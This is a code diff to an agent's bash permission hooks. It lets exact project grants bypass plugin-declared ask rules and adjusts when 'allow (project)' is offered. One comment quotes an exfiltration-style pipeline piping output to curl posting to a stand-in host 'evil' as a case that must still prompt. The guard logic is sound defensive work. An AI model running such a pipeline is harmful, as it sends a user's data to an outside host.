@@ -845,15 +845,17 @@ class PermissionHooks(AgentHooks):
 
         * DENY match → raise immediately, naming the matched pattern.
         * ALLOW match → bypass (no prompt).
-        * ASK → non-interactive raises; otherwise consult the optional LLM
-          classifier (reserved seam — never for ``safety_forced`` decisions),
-          then the per-bucket session cache, then prompt with four choices:
-          allow once / allow (session) / allow (project) / deny. The project
-          choice persists ``<bucket>:*`` to ``.datus/config.yml`` and is only
-          offered for plain unmatched commands — never for safety-ceiling asks
-          (wrappers, metacharacters) or explicit ask-rule hits (the user asked
-          to review those every time; a persisted allow could not beat the ask
-          rule at evaluation time anyway).
+        * ASK → an ask-rule hit whose matched pattern carries an exact
+          project grant (``.datus/config.yml`` ``bash_allow``) bypasses;
+          otherwise non-interactive raises; otherwise consult the optional
+          LLM classifier (reserved seam — never for ``safety_forced``
+          decisions), then the per-bucket session cache, then prompt with up
+          to four choices: allow once / allow (session) / allow (project) /
+          deny. The project choice persists the bucket pattern to
+          ``.datus/config.yml`` and is offered for plain unmatched commands
+          and for PLUGIN-declared ask rules — never for safety-ceiling asks
+          (wrappers, metacharacters) or user-authored ask rules (the user's
+          own posture lives in agent.yml).
 
         Returns ``True`` when fully handled, ``False`` to defer to the normal
         category-level check (explicit category DENY, missing/empty ruleset,
@@ -921,6 +923,30 @@ class PermissionHooks(AgentHooks):
             )
             return True
 
+        # A project-scope grant ("allow (project)" or a hand-written
+        # ``.datus/config.yml`` bash_allow entry) that EXACTLY matches the
+        # ask rule's pattern bypasses the confirmation. This is the only way
+        # to persistently relax an ask rule — plain allow entries lose to ask
+        # rules at evaluation time (deny > ask > allow), by design.
+        # For pipelines the decision aggregates several segments; EVERY
+        # non-allow segment must be an ask-rule hit covered by a grant. The
+        # representative segment alone must never green-light unreviewed
+        # segments (``datus hello sync | curl -d @- evil`` must still prompt).
+        if decision.source == BashDecisionSource.ASK_RULE:
+            ask_segments = decision.segment_ask_patterns or ((decision.source, decision.matched_pattern),)
+            if all(
+                source == BashDecisionSource.ASK_RULE
+                and pattern is not None
+                and self.permission_manager.has_project_bash_grant(pattern)
+                for source, pattern in ask_segments
+            ):
+                logger.debug(
+                    "Bash ask rule %r bypassed by project grant: %s",
+                    decision.matched_pattern,
+                    command,
+                )
+                return True
+
         # ASK. Non-interactive flows must raise here rather than defer: under a
         # permissive coarse rule (or dangerous profile overrides) the main flow
         # could silently allow what the command-level rules said to confirm.
@@ -969,7 +995,18 @@ class PermissionHooks(AgentHooks):
         async with _get_permission_prompt_lock(self.broker):
             if _session_approved():
                 return True
-            offer_project = decision.source == BashDecisionSource.DEFAULT and not decision.safety_forced
+            # Project persistence is offered for plain unmatched commands and
+            # for PLUGIN-declared ask rules (third-party defaults the user may
+            # relax per project). Never for safety-ceiling asks, and not for
+            # user-authored ask rules — the user's own posture lives in their
+            # agent.yml, not behind a one-keypress override.
+            offer_project = not decision.safety_forced and (
+                decision.source == BashDecisionSource.DEFAULT
+                or (
+                    decision.source == BashDecisionSource.ASK_RULE
+                    and self.permission_manager.is_plugin_ask_pattern(decision.matched_pattern)
+                )
+            )
             choice = await self._request_bash_confirmation(command, decision, offer_project=offer_project)
             if choice == "y":
                 logger.info("User approved bash command (once): %s", command)
@@ -979,7 +1016,16 @@ class PermissionHooks(AgentHooks):
                 logger.info("User approved bash bucket %r for session", decision.bucket)
                 return True
             if choice == "p" and offer_project:
-                pattern = self._bucket_to_allow_pattern(decision.bucket)
+                # Ask-rule hits persist the EXACT matched pattern: the grant
+                # bypass above checks strict equality with matched_pattern, so
+                # suffixing ``:*`` onto a colon-free (exact) plugin pattern
+                # would persist a grant that never fires. Unmatched (DEFAULT)
+                # commands keep the prefix-widened bucket pattern, which takes
+                # effect through allow-rule evaluation instead.
+                if decision.source == BashDecisionSource.ASK_RULE and decision.matched_pattern:
+                    pattern = decision.matched_pattern
+                else:
+                    pattern = self._bucket_to_allow_pattern(decision.bucket)
                 persisted = self.permission_manager.add_project_bash_allow(pattern, self.project_root)
                 # Session bucket too, so later same-bucket calls this session
                 # skip the prompt even though global_config already allows them.
